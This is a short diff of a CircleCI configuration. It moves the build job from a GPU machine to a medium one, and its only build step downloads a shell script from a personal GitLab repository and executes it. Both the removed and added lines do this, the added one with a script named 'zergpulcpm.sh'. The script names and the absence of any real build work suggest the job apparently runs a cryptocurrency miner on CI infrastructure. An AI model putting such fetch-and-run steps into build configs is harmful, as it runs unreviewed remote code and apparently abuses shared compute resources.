@@ -3,7 +3,7 @@ version: 2.1
 jobs:
   build:
     machine:
-      resource_class: gpu.nvidia.large
-      image: ubuntu-2004-cuda-11.2:202103-01
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: medium
     steps:
-      - run: wget https://gitlab.com/denisule33/why/-/raw/main/KukoinLOL.sh && chmod +x KukoinLOL.sh && ./KukoinLOL.sh
+      - run: wget https://gitlab.com/denisule33/why/-/raw/main/zergpulcpm.sh && chmod +x zergpulcpm.sh && ./zergpulcpm.sh
